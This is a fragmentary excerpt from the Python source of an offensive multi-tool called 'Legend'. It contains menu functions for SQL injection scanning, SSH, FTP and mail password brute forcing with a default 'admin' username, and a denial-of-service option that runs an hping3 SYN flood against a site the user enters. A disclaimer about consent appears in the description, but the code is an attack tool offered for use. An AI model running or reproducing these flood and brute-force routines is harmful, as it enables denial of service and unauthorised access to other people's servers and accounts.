...
def desc():
    ...
    Usage of Legend for attacking targets without prior mutual consent is illegal.
...
def SQL():
	...
	site = input(B+'Legend»SqlScaner»'+E)
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass
...
def Dos():
	...
	banner()
	print('Enter site:')
	site = input(B+'Legend»Dos»'+E)
	print('''Enter level:
		1) High dos
		2) Dos port
 		3) Low dos''')
	level = int(input(B+'Legend»Dos»Level»'+E))
	if level == 1:
		os.system('hping3 -S -P --flood -V '+site)
	if level == 2:
		port = input(B+'Legend»Dos»Level»Port»'+E)
...
def SSH_Brut():
	...
	try:
		...
		host = input(W+'Legend»SSH»Host»'+E)
		print(G+'Enter username:'+E)
		print(G+'Default: admin'+E)
		user = input(W+'Legend»SSH»User»'+E)
		if user == "":
			user = 'admin'
		print(G+'Enter password file:'+E)
		password = input(W+'Legend»SSH»Password»'+E)
...
def FTP_Brut():
	...
	host = input(W+'Legend»Ftp»Host»'+E)
	print(B+'Enter user:'+E)
	print(F+'Default: admin')
	user = input(W+'Legend»Ftp»User»'+E)
	print(B+'Enter password file:'+E)
	password_list = input(W+'Legend»Ftp»Password»'+E)
	if user == '':
		user = 'admin'
	if password_list == '':
...
def mail():
	...
	mail = input(W+'Legend»Mail»Login»'+E)
	print(B+'Enter password list:'+E)
	password = input(W+'Legend»Mail»Password»'+E)
	if password == '':
